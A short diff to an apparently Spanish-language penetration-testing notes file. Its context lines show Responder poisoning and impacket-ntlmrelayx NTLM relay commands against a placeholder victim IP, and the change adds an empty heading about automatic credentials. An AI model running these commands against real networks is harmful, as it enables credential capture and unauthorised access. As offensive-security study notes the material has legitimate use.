@@ -159,3 +159,5 @@ sudo responder -I eth0 -dw
 impacket-ntlmrelayx -t <IP_VÍCTIMA> -smb2support
 #(Actualizar este punto porque parece que los comandos y la ejecución está bastante deprecada)
 ```
+
+### Credenciales Auto
